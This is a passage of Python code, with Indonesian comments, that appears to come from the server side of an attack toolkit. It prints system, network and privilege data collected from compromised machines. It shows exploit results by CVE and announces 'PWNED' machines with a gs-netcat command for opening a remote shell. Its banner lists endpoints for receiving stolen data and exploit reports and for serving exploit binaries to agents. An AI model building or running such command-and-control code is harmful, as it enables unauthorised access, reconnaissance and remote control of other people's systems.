MAGENTA= "\033[0;35m"
CYAN   = "\033[0;36m"
WHITE  = "\033[1;37m"
BG_BLK = "\033[40m"

def cyber_border(char="═", width=68):
    return f"{CYAN}{char * width}{RESET}"

def print_cyber_event(event_type, data, server_id):
    """Print koleksi data ke terminal dengan gaya cyber"""
    sys_info = data.get("system", {})
    net_info = data.get("network", {})
    usr_info = data.get("user", {})
    hw_info  = data.get("hardware", {})
    svc_info = data.get("services", {})

    print(f"\n{cyber_border('═')}")
    print(f"  {BOLD}{CYAN}⬡ {event_type} EVENT{RESET}  {DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print(f"  {MAGENTA}Server ID:{RESET} {WHITE}{server_id}{RESET}")
    print(f"  {MAGENTA}Machine: {RESET} {GREEN}{sys_info.get('hostname', '?')}{RESET}  |  "
          f"{DIM}OS:{RESET} {sys_info.get('os', '?')[:45]}  |  "
          f"{DIM}Kernel:{RESET} {sys_info.get('kernel', '?')}")
    print(f"  {MAGENTA}Network: {RESET} "
          f"{DIM}Public:{RESET} {YELLOW}{net_info.get('public_ip', '?')}{RESET}  "
          f"{DIM}Private:{RESET} {net_info.get('private_ip', '?')}  "
          f"{DIM}Ports:{RESET} {net_info.get('open_ports', '?')}")
    print(f"  {MAGENTA}User:   {RESET} {usr_info.get('username', '?')}  "
          f"{DIM}UID:{RESET} {usr_info.get('uid', '?')}  "
          f"{DIM}Root:{RESET} {'🔴 YES' if usr_info.get('is_root') == True else f'{DIM}no{RESET}'}  "
          f"{DIM}Sudo:{RESET} {'🟡 YES' if usr_info.get('sudo_access') == True else f'{DIM}no{RESET}'}")
    print(f"  {MAGENTA}HW:     {RESET} {hw_info.get('cpu_model', '?')[:35]}  "
          f"{DIM}RAM:{RESET} {hw_info.get('ram_total_mb', '?')}MB  "
          f"{DIM}Disk:{RESET} {hw_info.get('disk_percent', '?')}")
    print(f"  {MAGENTA}Services:{RESET} "
          f"{DIM}Docker:{RESET} {svc_info.get('docker', {}).get('running_containers', '?')}ctrs  "
          f"{DIM}FW:{RESET} {svc_info.get('firewall', '?')}  "
          f"{DIM}Pkgs:{RESET} {svc_info.get('installed_packages', '?')}  "
          f"{DIM}Procs:{RESET} {svc_info.get('process_count', '?')}")
    print(f"{cyber_border('═')}")


def print_cyber_audit(machine_id, name, cve, status):
    """Print hasil audit exploit ke terminal"""
    short_id = machine_id[:10]
    if status == "vulnerable":
        icon = f"{RED}⬡ VULN{RESET}"
    elif status == "crash":
        icon = f"{YELLOW}◈ CRASH{RESET}"
    else:
        icon = f"{GREEN}✓ SAFE{RESET}"

    print(f"  {DIM}[{short_id}]{RESET} {icon}  {WHITE}{name:20s}{RESET}  {CYAN}{cve:18s}{RESET}")


def print_cyber_pwned(machine_id, exploit, cve, secret):
    """Print pwned event dengan highlight"""
    print(f"\n  {RED}{BOLD}⚡ ⚡ ⚡  PWNED!  ⚡ ⚡ ⚡{RESET}")
    print(f"  {RED}Machine:{RESET} {WHITE}{machine_id[:16]}{RESET}")
    print(f"  {RED}Exploit:{RESET} {WHITE}{exploit} ({cve}){RESET}")
    print(f"  {RED}Secret: {RESET} {MAGENTA}{secret}{RESET}")
    print(f"  {RED}Connect:{RESET} {DIM}gs-netcat -s {secret}{RESET}")
    print(f"  {cyber_border('─', 40)}")


# ═══════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════

def print_startup_banner():
    banner = f"""
{RED}
       █████    ███████    ███████████ █████   █████
      ▒▒███   ███▒▒▒▒▒███ ▒█▒▒▒███▒▒▒█▒▒███   ▒▒███ 
       ▒███  ███     ▒▒███▒   ▒███  ▒  ▒███    ▒███ 
       ▒███ ▒███      ▒███    ▒███     ▒███████████ 
       ▒███ ▒███      ▒███    ▒███     ▒███▒▒▒▒▒███ 
 ███   ▒███ ▒▒███     ███     ▒███     ▒███    ▒███ 
▒▒████████   ▒▒▒███████▒      █████    █████   █████
 ▒▒▒▒▒▒▒▒      ▒▒▒▒▒▒▒       ▒▒▒▒▒    ▒▒▒▒▒   ▒▒▒▒▒
{RESET}
{BOLD}{RED}   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀{RESET}
{BOLD}{RED}      AKTR1PT1C - CYBER INTELLIGENCE COMMAND CENTER{RESET}
{BOLD}{RED}   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄{RESET}

  {DIM}Listening:{RESET}   {GREEN}{BIND_HOST}:{BIND_PORT}{RESET}
  {DIM}Dashboard:{RESET}   {RED}http://{BIND_HOST}:{BIND_PORT}/{RESET}
  {DIM}Data Dir:{RESET}    {YELLOW}{DATA_DIR}{RESET}
  {DIM}Bin Dir:{RESET}     {YELLOW}{BIN_DIR}{RESET}

  {DIM}Endpoints:{RESET}
    {WHITE}POST{RESET} /v1/collect      {DIM}← System info collection{RESET}
    {WHITE}POST{RESET} /v1/audit/live    {DIM}← Real-time exploit results{RESET}
    {WHITE}POST{RESET} /v1/pwned         {DIM}← Successful exploit reports{RESET}
    {WHITE}GET{RESET}  /bin/{{name}}      {DIM}← Exploit binary delivery{RESET}

  {DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}

  {GREEN}[✓]{RESET} Server ready. Waiting for agents...
"""
    print(banner)


if __name__ == "__main__":
    print_startup_banner()

    # Install flask-cors jika belum ada
    try:
        from flask_cors import CORS
    except ImportError:
        print(f"{YELLOW}[!]{RESET} Installing flask-cors...")
        import subprocess
        subprocess.check_call(["pip3", "install", "flask-cors", "-q"])

    app.run(host=BIND_HOST, port=BIND_PORT, debug=False, threaded=True)
